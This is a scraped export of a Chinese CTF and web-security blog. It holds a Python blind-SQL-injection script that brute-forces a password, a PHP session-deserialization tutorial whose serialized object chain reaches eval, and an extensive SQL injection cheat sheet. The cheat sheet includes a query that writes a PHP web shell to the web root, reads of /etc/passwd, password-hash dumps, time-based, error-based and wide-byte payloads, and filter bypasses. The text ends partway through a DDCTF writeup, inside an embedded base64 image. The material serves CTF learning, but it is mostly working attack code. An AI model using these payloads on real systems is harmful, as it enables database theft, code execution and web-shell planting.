res=requests.post(url,headers=data) # print res.content password = &quot;&quot; for i in range(10): for j in range(33,128): data={ &#39;username&#39;:&quot;union_373_Tom&#39;/*&quot;, &#39;password&#39;: &quot;*/ union select 1,2,\\&quot;&quot;+password+chr(j)+&quot;\\&quot; order by 3,2,&#39;1&quot; } print j res=requests.post(url,data=data,headers=head) # print res.content if &#39;union_373_Tom&#39; in res.content: password += chr(j-1) print password break 即可得到密码，就是flag 感觉这次iscc的题目不是特别难，而且还有好多原题，感觉自己还是很菜。","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"session 反序列化","slug":"session-反序列化","date":"2019-05-14T10:49:02.000Z","updated":"2019-05-29T12:32:11.053Z","comments":true,"path":"2019/05/14/session-反序列化/","link":"","permalink":"http://yoursite.com/2019/05/14/session-反序列化/","excerpt":"session-反序列化前言通过一道ctf题，感觉自己对php session 反序列化的认识并不深刻，所以想要再次总结一下","text":"session-反序列化前言通过一道ctf题，感觉自己对php session 反序列化的认识并不深刻，所以想要再次总结一下 简介在php.ini中存在几项配置项： session.save_path=&quot;&quot; --设置session的存储路径 session.save_handler=&quot;&quot; --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式) session.auto_start boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动 session.serialize_handler string --定义用来序列化/反序列化的处理器名字。默认使用php 以上的选项就是与PHP中的Session存储和序列话存储有关的选项。 在使用xampp组件安装中，上述的配置项的设置如下： session.save_path=&quot;D:\\xampp\\tmp&quot; 表明所有的session文件都是存储在xampp/tmp下 session.save_handler=files 表明session是以文件的方式来进行存储的 session.auto_start=0 表明默认不启动session session.serialize_handler=php 表明session的默认序列话引擎使用的是php序列话引擎 在上述的配置中，session.serialize_handler是用来设置session的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。 php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值 php:存储方式是，键名+竖线+经过serialize()函数序列处理的值 php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值 默认引擎为PHP引擎, 可以添加代码ini_set(&#39;session.serialize_handler&#39;, &#39;需要设置的引擎&#39;); session 存储机制php中的session的内容并不是放在内存中的，二十以文件的方式来存储的，存储方式就是有配置项session.sace_handler来进行确定的,默认是以文件的方式存储。 存储文件都是以sess_sessionid来进行命名的，文件的内容就是session值的序列化之后的内容 不同版本的引擎 保存的文件也不同同样存储$_SESSION[&#39;chuddy&#39;]=、&quot;chuddy123&quot;;这样的一个session ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;); a:1:{s:6:&quot;chuddy&quot;;s:9:&quot;chuddy123&quot;;} ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;); chuddy|s:9:&quot;chuddy123&quot;; ini_set(&#39;session.serialize_handler&#39;, &#39;php_binary&#39;); \u0006chuddys:9:&quot;chuddy123&quot;; 由于`chuddy`的长度是6，6在ASCII表中对应的就是&lt;0x06&gt;。 根据php_binary的存储规则，最后就是\u0006chuddys:9:&quot;chuddy123&quot;; PHP Session中的序列化的危害PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。 如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。 例如： $_SESSION[&#39;chuddy&#39;] = &#39;|O:11:&quot;chuddyClass&quot;:0:{}&#39;; 上述的$_SESSION数据使用php_serialize，那么最后的存储的内容就是a:1:{s:6:&quot;chuddy&quot;;s:24:&quot;|O:11:&quot;chuddyClass&quot;:0:{}&quot;;}。 但是当我们进行读取的时候，选择的是php，那么最后读取的内容就会发生改变的当使用php引擎的时候，php引擎会以|作为key和value的分隔符，那么就会将a:1:{s:6:&quot;chuddy&quot;;s:24:&quot;作为SESSION的key值，将O:11:&quot;chuddyClass&quot;:0:{}&quot;;}作为SESSION的value值，然后进行反序列化，最后会得到chuddyClass这个类 这种由于序列话化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。 实际利用存在session1.php和session2.php着这两个文件 session1.php &lt;?php ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;); echo @$_GET[&#39;chuddy&#39;]; session_start(); $_SESSION[&#39;chuddy&#39;] = @$_GET[&#39;chuddy&#39;]; ?&gt; session2.php &lt;?php ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;); session_start(); var_dump($_SESSION); class chuddy{ function __destruct(){ echo phpinfo(); } } ?&gt; 当访问session1.php时 提交一下数据： session1.php?chuddy=|O:6:%22chuddy%22:0:{} 此时传入的数据会按照php_serialize来进行序列化存储 然后去访问session2.php,页面会输出phpinfo()函数，说明成功执行了我们构造的函数。 是因为在访问session2.php时，程序会按照php引擎来解析，SESSION中的数据，此时就会反序列化伪造的数据，就会实例化一个chuddy对象，最后就会执行析构函数中的phpinfo() CTF例题安恒月赛的一道 反序列化题目： 环境配置： php版本&gt;5.5.4 #php.ini部分相关配置 session.auto_start=Off session.serialize_handler=php_serialize session.upload_progress.cleanup=Off session.upload_progress.enabled=On 主要给出了几个文件的源码： class.php &lt;?php highlight_string(file_get_contents(basename($_SERVER[&#39;PHP_SELF&#39;]))); //show_source(__FILE__); class foo1{ public $varr; function __construct(){ $this-&gt;varr = &quot;index.php&quot;; } function __destruct(){ if(file_exists($this-&gt;varr)){ echo &quot;&lt;br&gt;文件&quot;.$this-&gt;varr.&quot;存在&lt;br&gt;&quot;; } echo &quot;&lt;br&gt;这是foo1的析构函数&lt;br&gt;&quot;; } } class foo2{ public $varr; public $obj; function __construct(){ $this-&gt;varr = &#39;1234567890&#39;; $this-&gt;obj = null; } function __toString(){ $this-&gt;obj-&gt;execute(); return $this-&gt;varr; } function __desctuct(){ echo &quot;&lt;br&gt;这是foo2的析构函数&lt;br&gt;&quot;; } } class foo3{ public $varr; function execute(){ eval($this-&gt;varr); } function __desctuct(){ echo &quot;&lt;br&gt;这是foo3的析构函数&lt;br&gt;&quot;; } } ?&gt; index.php &lt;?php ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;); require(&quot;./class.php&quot;); session_start(); $obj = new foo1(); $obj-&gt;varr = &quot;phpinfo.php&quot;; ?&gt; phpinfo.php &lt;?php session_start(); require(&quot;./class.php&quot;); $f3 = new foo3(); $f3-&gt;varr = &quot;phpinfo();&quot;; $f3-&gt;execute(); ?&gt; 通过代码 发现了危险函数eval 可以想到利用php session 反序列化来进行构造自己想要的 访问phpinfo.php 发现[]可以看到一些敏感的配置信息，也找到一下比较有用的信息 session.upload_progress.enabled，当它为开启状态时，PHP能够在每一个文件上传时监测上传进度。 当一个上传在处理中，同时POST一个与php.ini中设置的session.upload_progress.name同名变量时，上传进度就可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix与 session.upload_progress.name连接在一起的值。 a:1:{s:19:&quot;upload_progress_123&quot;;a:5:{s:10:&quot;start_time&quot;;i:1558005301;s:14:&quot;content_length&quot;;i:471;s:15:&quot;bytes_processed&quot;;i:471;s:4:&quot;done&quot;;b:1;s:5:&quot;files&quot;;a:1:{i:0;a:7:{s:10:&quot;field_name&quot;;s:4:&quot;file&quot;;s:4:&quot;name&quot;;s:139:&quot;|O:4:&quot;foo1&quot;:1:{s:4:&quot;varr&quot;;O:4:&quot;foo2&quot;:2:{s:4:&quot;varr&quot;;s:10:&quot;1234567890&quot;;s:3:&quot;obj&quot;;O:4:&quot;foo3&quot;:1:{s:4:&quot;varr&quot;;s:24:&quot;var_dump(scandir(&quot;./&quot;));&quot;;}}} 测试一下 构造一个可以实现我们想要的功能的本地测试的代码： &lt;?php class foo3{ public $varr=&#39;var_dump(scandir(&quot;./&quot;));&#39;; function execute(){ eval($this-&gt;varr); } } class foo2{ public $varr; public $obj; function __construct(){ $this-&gt;varr = &#39;1234567890&#39;; $this-&gt;obj = new foo3(); } function __toString(){ $this-&gt;obj-&gt;execute(); return $this-&gt;varr; } } class foo1{ public $varr; function __construct(){ $this-&gt;varr = new foo2(); } } $obj = new foo1(); print_r(serialize($obj)); ?&gt; 在foo1中的构造函数中定义varr的值为foo2的实例，在foo2中定义obj为foo3的实例，在foo3中定义$varr的值var_dump(scandir(‘./‘)); 输出了序列化后的类 O:4:&quot;foo1&quot;:1:{s:4:&quot;varr&quot;;O:4:&quot;foo2&quot;:2:{s:4:&quot;varr&quot;;s:10:&quot;1234567890&quot;;s:3:&quot;obj&quot;;O:4:&quot;foo3&quot;:1:{s:4:&quot;varr&quot;;s:24:&quot;var_dump(scandir(&quot;./&quot;));&quot;;}}} 然后通过上面讲的将这个类存入session文件中: &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;test&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;./index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;go&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 然后抓包修改相应的内容： [] 然后修改相应的参数 就可以找到 flag文件 并读取出来；这就不一一细说了。 总结感觉自己还是特别菜 好多还不会 希望能够静下心来 好好学","categories":[],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://yoursite.com/tags/web漏洞/"}]},{"title":"sql注入","slug":"sql注入","date":"2019-05-02T08:31:07.000Z","updated":"2019-05-29T12:32:11.717Z","comments":true,"path":"2019/05/02/sql注入/","link":"","permalink":"http://yoursite.com/2019/05/02/sql注入/","excerpt":"sql注入漏洞前言感觉自己以前学的比较粗糙，这一段打算逐一把学过的漏洞再重新学习一边，加深一下印象。","text":"sql注入漏洞前言感觉自己以前学的比较粗糙，这一段打算逐一把学过的漏洞再重新学习一边，加深一下印象。 sql注入简介Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。 mysql数据库的知识储备mysql数据库中的一些全局变量 user() 当前用户 version() 数据库版本 database() 当前数据库名 @@version_compile_os 当前的操作系统 数据库中常见的注释符： 1. -- 后面有一个空格 2. /*...*/ 3. # 在MySQL中有一个叫做information_schema的库，它存储着所有表的信息 虽然里面有这么多的表，常用的不是特别多 schemata、TABLES、COLUMNS schemata表，这个便存储了mysql数据库的所有库名 tables表里面包含了数据库中的所有的表名 COLUMNS表中存储了所有表的字段信息 一些常用的查找语句 所有用户 select group_concat(user) from mysql.user 用户hash: select group_concat(password) from mysql.user where user=&#39;root&#39; 所有数据库： select group_concat(schema_name) from information_schema.schemata 表名： select group_concat(table_name) from information_schema.tables where table_schema=&#39;库名&#39; //表中有主码约束，非空约束等完整性约束条件的才能用这个语句查询出来 select group_concat(table_name) from information_schema.table_constraints where table_schema=&#39;库名&#39; 字段名： select group_concat(column_name) from information_schema.columns where table_name=&#39;表名&#39; 读文件： select load_file(&#39;/etc/passwd&#39;) 写文件： select &lt;?php @eval($_POST[&#39;a&#39;]); ?&gt; into outfile &#39;/var/www/html/shell.php&#39; 常见的sql注入类型union注入联合注入也是常见一种注入方式，利用条件页面需要有回显位。 猜字段的长度页面有回显的情况下可以通过：order by 来猜测字段的长度 id=1&#39; order by 3-- 猜字段的位置如果已经知道字段的长度为3的话可以通过联合查询来爆出字段的位置 id=-1&#39; union select 1,2,3-- 基本语法union select 1,flag,3 from flag 过滤了逗号的联合注入mysql&gt; select * from user1 where id=-1 union select * from (select version())a join (select database())b join (select database())c; +--------+------+------+ | id | name | pass | +--------+------+------+ | 5.5.53 | test | test | +--------+------+------+ 1 row in set (0.04 sec) 报错注入mysql数据库的报错注入方法整理， floor UpdateXml ExtractValue NAME_CONST Error based Double Query Injection … floor?id=1 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x6368756464797e,(SELECT user()),0x7e636875646479,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) 操作： mysql&gt; select * from user where id=1 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x6368756464797e,(SELECT user()),0x7e636875646479,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a); ERROR 1062 (23000): Duplicate entry &#39;chuddy~root@localhost~chuddy1&#39; for key &#39;group_key&#39; ExtractValue(有长度限制,最长32位)?id=1 and extractvalue(1, concat(0x7e, (select @@version),0x7e)) mysql&gt; select * from user where 1 and extractvalue(1, concat(0x7e, (select @@version),0x7e)); ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.53~&#39; 当查询的书库超过32位 可以利用字符串截取函数，多次读取该数据 UpdateXml(有长度限制,最长32位)?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) 利用方式和ExtractValue方式差不多，当查询的书库超过32位 可以利用字符串截取函数，多次读取该数据 NAME_CONST(适用于低版本，不太好用)?id=261 and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x) Error based Double Query Injection?id=1 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1 exp(5.5.5以上)?id=1 and (select exp(~(select * from(select user())x))) polygonmysql&gt; select * from user where name = &quot;&quot; and polygon(pass); ERROR 1367 (22007): Illegal non geometric &#39;`test`.`user`.`pass`&#39; value found during parsing 布尔盲注基本语法 id = 1 and ascii(substr((select database()),1,1))&gt;97--+ 由于Mysql4之后对大小写就不敏感，可以使用binary()函数使大小写敏感。 构造布尔条件的骚姿势//正常情况 &#39;or bool# true&#39;and bool# //不使用空格、注释 &#39;or(bool)=&#39;1 true&#39;and(bool)=&#39;1 //不使用or、and、注释 &#39;^!(bool)=&#39;1 &#39;=(bool)=&#39; &#39;||(bool)=&#39;1 true&#39;%26%26(bool)=&#39;1 //%26就是&amp; &#39;=if((bool),1,0)=&#39;0 &#39;-(bool)-&#39; &#39;^(bool)^&#39; //不使用等号、空格、注释 &#39;or(bool)&lt;&gt;&#39;0 &#39;or((bool)in(1))or&#39;0 //其他 or (case when (bool) then 1 else 0 end) 构造逻辑判断常见的逻辑判断函数 字符串的截取函数： left(user(),1)&gt;&#39;c&#39; right(user(),1)&gt;&#39;c&#39; substr(user(),1,1)&gt;&#39;c&#39; mid(user(),1,1)=&#39;c&#39; 查询字符串的长度: length(&#39;chuddy&#39;) 查询字符的ascii码： ord(&#39;a&#39;) ascii(&#39;a&#39;) ascii转换字符: char(97) 布尔盲注的基本语法： ascii(substr((查询的sql语句),1,1))&gt;97 一些绕过方式 过滤了空格可以一下代替 /*1*/ %20 %a0 过滤了 = like &lt;&gt; regexp 过滤了一些关键词 可以大小写绕过 unIon、seLect、 如果关键词被替换位空白 可以双写绕过 selselectect、 uniunionon 特殊的盲注方法: 利用order by 盲注 ----+----------+----------------------------------+ | id | username | password | +----+----------+----------------------------------+ | 1 | 2 | 5 | | 1 | admin | 51b7a76d51e70b419f60d3473fb6f900 | +----+----------+----------------------------------+ 2 rows in set (0.00 sec) mysql&gt; select * from admin where username=&#39;&#39; or 1 union select 1,2,&#39;6&#39; order by 3; +----+----------+----------------------------------+ | id | username | password | +----+----------+----------------------------------+ | 1 | admin | 51b7a76d51e70b419f60d3473fb6f900 | | 1 | 2 | 6 | +----+----------+----------------------------------+ 2 rows in set (0.01 sec) 过滤很严格的话 可以通过一些其他它方式爆破密码 mysql&gt; select * from user1 where name=&quot;user4&quot; &amp;&amp; pass&gt;&#39;a1&#39;; +------+-------+--------+ | id | name | pass | +------+-------+--------+ | 4 | user4 | a1b2c3 | +------+-------+--------+ 1 row in set (0.00 sec) mysql&gt; select * from user1 where name=&quot;user4&quot; &amp;&amp; pass&gt;&#39;a2&#39;; Empty set (0.00 sec) 跨表查询数据 mysql&gt; select * from user1 where id =1 and (select a.pass&lt;&#39;7&#39; from user a limit 1); +------+-------+------+ | id | name | pass | +------+-------+------+ | 1 | user1 | 123 | +------+-------+------+ 1 row in set (0.00 sec) mysql&gt; select * from user1 where id =1 and (select a.pass&gt;&#39;7&#39; from user a limit 1); Empty set (0.00 sec) 延时注入相交于bool盲注，就是把返回值0和1改为是否延时的标准，一般格式为：if((bool),sleep(5),0)和or (case when (bool) then sleep(5) else 0 end) 延时函数： BENCHMARK(100000,MD5(1)) sleep BENCHMARK()用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。推荐使用sleep() 如果着两个函数被ban了可以利用笛卡儿积造成延迟来进行注入 &#39; and if(ascii(substr((select database()),%d,1))&lt;%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.tables C),1)# insert和uodate注入//insert 的报错注入 mysql&gt; insert into user2 values(null,&#39;a&#39; and extractvalue(1, concat(0x7e, (select @@version),0x7e))); ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.53~&#39; mysql&gt; insert into user2 values(null,&#39;a&#39; and extractvalue(1, concat(0x7e, (select database()),0x7e))); ERROR 1105 (HY000): XPATH syntax error: &#39;~y1~&#39; //update的报错注入 mysql&gt; update user2 set name=&#39;a&#39; where pass=&#39;a&#39; and extractvalue(1, concat(0x7e, (select @@version),0x7e)); ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.53~&#39; mysql&gt; update user2 set name=&#39;a&#39; where pass=&#39;a&#39; and extractvalue(1, concat(0x7e, (select database()),0x7e)); ERROR 1105 (HY000): XPATH syntax error: &#39;~y1~&#39; //insert 延时注入 database为y1 mysql&gt; insert into user2(name,pass) values(&#39;a&#39;, mid((select database()),1,1)=&quot;1&quot; or sleep(3)); Query OK, 1 row affected (3.00 sec) mysql&gt; insert into user2(name,pass) values(&#39;a&#39;, mid((select database()),1,1)=&quot;y&quot; or sleep(3)); Query OK, 1 row affected (0.00 sec) 如果存在insert或者update,更新后的数据是可见的话,那么利用mysql中字符串在与数字进行运算的时候当作是0进行运算 mysql&gt; select &#39;&#39;+1; +------+ | &#39;&#39;+1 | +------+ | 1 | +------+ 1 row in set (0.00 sec) 那么我们可以利用查询的数据转化为10进制,然后进行运算,拿到我们计算的结果,在进行转化回去即可 insert into 情况下： mysql&gt; insert into user(id,name,pass) values(&#39;7&#39;,&#39;chuddy&#39;,&#39;&#39;+conv(hex(substr(database(),1 + (1-1) * 6,6)),16,10)); Query OK, 1 row affected (0.00 sec) mysql&gt; select * from user where id=7; +------+--------+------------+ | id | name | pass | +------+--------+------------+ | 7 | chuddy | 1952805748 | +------+--------+------------+ 1 row in set (0.00 sec) mysql&gt; select unhex(conv(1952805748,10,16)); +-------------------------------+ | unhex(conv(1952805748,10,16)) | +-------------------------------+ | test | +-------------------------------+ 1 row in set (0.00 sec) update 情况下： mysql&gt; update user set pass=&#39;&#39;+conv(hex(substr(user(),1 + (1-1) * 6,6)),16,10) where id=3; Query OK, 1 row affected (0.11 sec) Rows matched: 1 Changed: 1 Warnings: 0 mysql&gt; select * from user where id =3; +------+-------------+-----------------+ | id | name | pass | +------+-------------+-----------------+ | 3 | ccccccccccc | 125822936825964 | +------+-------------+-----------------+ 1 row in set (0.04 sec) mysql&gt; select unhex(conv(125822936825964,10,16)); +------------------------------------+ | unhex(conv(125822936825964,10,16)) | +------------------------------------+ | root@l | +------------------------------------+ 1 row in set (0.00 sec) order by 注入报错注入常见的利用方式： order by 1 and extractvalue(1, concat(0x7e, (select @@version),0x7e)) mysql&gt; select * from user order by 1 and extractvalue(1, concat(0x7e, (select @@version),0x7e)); ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.53~&#39; mysql&gt; select * from user order by 1 and extractvalue(1, concat(0x7e, (select database()),0x7e)); ERROR 1105 (HY000): XPATH syntax error: &#39;~test~&#39; 盲注盲注的基本操作\\order by IF((bool),1,(select 1 union select 2)) mysql&gt; select * from user order by if((substr(database(),1,1)&lt;&#39;a&#39;),1,(select 1 union select 2)); ERROR 1242 (21000): Subquery returns more than 1 row mysql&gt; select * from user order by if((substr(database(),1,1)&gt;&#39;a&#39;),1,(select 1 union select 2)); +------+---------------+-----------------------+ | id | name | pass | +------+---------------+-----------------------+ | 1 | aaaaaaaaaa | 123 | | 2 | bbbbbbbbbbbbb | 456 | | 3 | ccccccccccc | 3.2210671827446896e16 | | 4 | dddddddddddd | 258 | | 5 | eeeeeeeee | 159 | | NULL | | NULL | | 6 | cccc | 58 | | 7 | chuddy | 1952805748 | +------+---------------+-----------------------+ 8 rows in set (0.02 sec) 延时注入不推荐，因为每条数据都会执行延时，能用其他方法就不使用延时。\\order by IF(1,sleep(3),0); 两条数据就会延时了6秒 宽字节注入原理：在GBK编码时，mysql会认为两个字符是一个汉字（在前一个字节的ascii码大于128的情况下）。而经过转义之后的单引号&#39;会变为\\&#39;，即%5c%27。构造id=1%df%27%23，在经过转义传递给mysql时，就是id=1%df%5c%27%23，mysql在解析时，会认为%df%5c是一个汉字，而%27就会闭合掉原本sql语句中的（左）单引号，即select xxx from xxx where id=&#39;%df%5c&#39;#&#39;，%23用于注释掉原本sql语句中的（右）单引号。这就是宽字节注入的原理。 注入方式和正常的注入差不多的： %df%27%20union%20select%201,database()--+","categories":[],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://yoursite.com/tags/web漏洞/"}]},{"title":"didictf writeup","slug":"2019didictf部分writeup","date":"2019-04-22T08:18:10.000Z","updated":"2019-06-05T08:53:09.346Z","comments":true,"path":"2019/04/22/2019didictf部分writeup/","link":"","permalink":"http://yoursite.com/2019/04/22/2019didictf部分writeup/","excerpt":"2019DDCTF writeupweb","text":"2019DDCTF writeupweb 滴~打开题目 发现url中的jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09有一点不正常，像是base64加密得到的，尝试发现是flag.jpg先进行base16加密在进行两次base64加密得到的 页面的源代码中是对flag.jpg进行base64加密后输出的 &lt;title&gt;TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&lt;/title&gt;flag.jpg&lt;/br&gt;flag.jpg&lt;/br&gt;&lt;img src=&#39;data:image/gif;base64,/9j/4AAQSkZJRgABAQEASABIAAD/4SjXRXhpZgAATU0AKgAAAAgACAEAAAMAAAABAD0AAAEBAAMAAAABAEEAAAESAAQAAAABAAAAAAEaAAUAAAABAAAAbgEbAAUAAAABAAAAdgEoAAMAAAABAAIAAAITAAMAAAABAAEAAIdpAAQAAAABAAAAfgAAAOQAAABIAAAAAQAAAEgAAAABAAiQAAAHAAAABDAyMjGRAQAHAAAABAECAwCSCAAEAAAAAQAAAACgAAAHAAAABDAxMDCgAQADAAAAAQABAACgAgAEAAAAAQAAAD2gAwAEAAAAAQAAAEGkBgADAAAAAQAAAAAAAAAAAAYBAwADAAAAAQAGAAABGgAFAAAAAQAAATIBGwAFAAAAAQAAAToBKAADAAAAAQACAAACAQAEAAAAAQAAAUICAgAEAAAAAQAAJ4sAAAAAAAAASAAAAAEAAABIAAAAAf/Y/8AAEQgAoACWAwEiAAIRAQMRAf/EAB8AAAEFAQEBAQEBAAAAAAAAAAABAgMEBQYHCAkKC//EALUQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+v/EAB8BAAMBAQEBAQEBAQEAAAAAAAABAgMEBQYHCAkKC//EALURAAIBAgQEAwQHBQQEAAECdwABAgMRBAUhMQYSQVEHYXETIjKBCBRCkaGxwQkjM1LwFWJy0QoWJDThJfEXGBkaJicoKSo1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoKDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uLj5OXm5+jp6vLz9PX29/j5+v/bAEMAAQEBAQEBAgEBAgMCAgIDBAMDAwMEBQQEBAQEBQYFBQUFBQUGBgYGBgYGBgcHBwcHBwgICAgICQkJCQkJCQkJCf/bAEMBAQEBAgICBAICBAkGBQYJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCf/dAAQACv/aAAwDAQACEQMRAD8A/vPni2vit6zXbCM1WuYfnGKuwrtioAyr9YrhvsNx/qpc7j9PesyKNrC/XTdII2Opck88/WrOuxzz6VOttkSDG3HJ61g3mo23h/RmuS6rKq7iScduetAHSXmr28cpsp/uyDbuGMZbjrWQ1headu/smRB5vG5uQMetfy3/APBRX/guZZfAX4YxaP8AC5U1fxLfXbWlqLW7iMqyyRv5REZifcQ+MDua/CnR/wDgrx/wX41RP7f0Xwn4wvdAv+IXi06ExKq8Md/2Y5Gc1SlYalY/0M4oNIg1RrrW7mO5vAxKrA44z1BHrUl9P4r07UFu73VLC2h2fKsp2ttOcda/gQ+HH7cv/BdP4Z+Il+LPi74W+NfE2n3rm7WNNOSFVSQbQu8W5zyc5r6b179q7/gr3+0Br9rH4r8DeKvDUM8CgLdWKvtTJIOfITj5sfhQ6g+dn9i/jL40/DXwmP7Q8U+ItOOzBIS5iBwBnuw9K8n1D9uX9nWzsJtXttRjnNkhlAjuIWJxzwN9fzRXf/BHD9qP9qTw+ZvE/wAX4/CV1KCALvSPMI42jjzU/vZ/CuM0P/g2F/a88Ng3um/tT2NzAvzNbJ4eGZQv8AP2okE0c7FKTsf1G+Ev21/g14+8I6n4t0bWLSynsJEULc3EKn58Z43+hr3Hw348tvHF5Br/AIS17Tby0WHbL5UqSHzMbiMqSOhHFfyI+KP+De79o/4bfD7Vtcv/AI1wXhnZJTANFKM2WA6+ea+cvHUn/BQf/gluln8Nvgvoet/EAassWptNpliIgDcHyWTayTcgRAk56EcVzXPMhc/vEfxK9zY2lzpcsa77gI+4g5Xviuns2s5L+6EUqNKcbgGzjjjIr+Wj4f8A/BVX4pfA34GWHiP9sL4dal4MuVvJG8/WpltA+F3qg3QqMlQT9BXyfd/8HO/gS88X+ONM+GvhTbHawR7NZh1SKWFSycSYMBGEPXntQkd9PY/tIuru20w+SrgSyc4J6468UkHkW9oRpbhmZ9zc7uT1r+UD9ln/AIL7/B/4m3UGkfEPxHpt9rt0f9GZtQgR4lCFnXYqDd0OfSv6BdG/aB+Hknhyy1rwBqlrqz3ojdltZlcgy4Lc89M81pBaGskfZpjKrvjIz3oQkrk9azLe/wDLsLeVV83zWCkjtnvWuwwcVZJWPU0lKeppKAP/0P757iYE/uxuzTlkuhHgRZ/Gp0gVGz1+tRXt0LSIuOwNAHN6hf3OmzpfagnlWi581s5Az0yB71+dP/BTL9o/w3+zD+zfe/FjUL4xwNNFaocunzz5C8qGPX2r77udae7dtRu1Bt7Q4deud3Tg9a/n+/4OHfgF4w/aR/ZlHg3w1MbTThJaXTtHJ5Tb4nZgOeMYoA/nK/4JLf8ABO/4ufE/4vj4sftx6a0Wh6VMNRtRqQiv0klguEkVAA5K7kz82OBX91/w08HfDDVPD1s3hvQbO08NvkWiRRgRFdx3gJgY5z2r/Ke8FftD/Gf4t+FYfA/w21nU11W8uWsriNJ5kRIGPlF0Ib72SPav9GX/AIIpfDjxr4T/AOCd3gXwH4/v7q7vdOt7gXE9xKZZiHuZWyWbkkA8VhWlaxhWdrH6+nwppZsI9O+X7AihY7fb+72DoAPQUamngeO5juNUghKxRBAWTOAM4HSvyO/4KVfGv9rj4fx6R4a/ZQ0vTNUX7GyzvqkkkbCRZcDBRl428/Wv50P2j/gL/wAFNvHVzF4o8ZXw0qSSFGMWm6jMI9pZmzjceeSPoBWHtDH2jP7itJHgzxTqJTR7aFljXdkL1wenIFdmLPSrbcnkJB5XOQP89K/l3/4Ip2/jPwv8Qb/SPibrl/dSizcqss7SrkzR4+8a/Yv9tH9uzwl+y94K1bUrnZM9naTy4dCxPloG/hIPeiNTUXtX3PvvVLDTdY04QatZx3dsyjPmAEEZyOD71x2q/DzwbNt1PWdMt7qZFEcMssYLRr/Cq9cAHkV/Hk//AAdeeAPDniT/AIR7xjpgjs4nZA8NlcMxVeAfv461+i/7N3/Byf8AsRfH7WLfwfqNxfWt1MflAsnQfKFxy7Hua3uQj9LP2p/2Vvg1+0N4UsvB3x+itdTt9KuhqGy/tluVlCqw8oqxwAVJGeeD0r8Z/jt8P/8Agjd+zjYav4H8ZeDfCnhf+3IHtvMi0rO7C8khIznbu7mv6WvDvjPwr8RPC8/iHR1S4sHhcJJIo3lgOR+tfhr/AMFJ/wBjn9nf4jeBtU+L3xQutStP7JtLm7jSxjjYHZGNwKlCeiimjup7H4oftLf8El/2a/j3+zlffEL9gOSyt/E/k28mmyaTpyWkziSVGdlkd4yv7ndn1GRX5jf8E4P+Civ7T3/BPD9oa3+AP7VekXXiBZJ5lSXU9RLbFmIgiwiLKPlKkjmvoG0/4LVfCD9lHw3qHgb9n63vNT8TaOy2un2urWcqW8oQiNzIUK8iPcRjHIFfJn7PP7G37S//AAU//adsP2gfihYW+h2nmnjT5DGP3UnnrxKGPO/nmtILQ1kf6gXg3TBZ6Tb6jNqL3EV3GvlqwOFZ+cjntXo0ULW8ASRy5Hc9TXl3g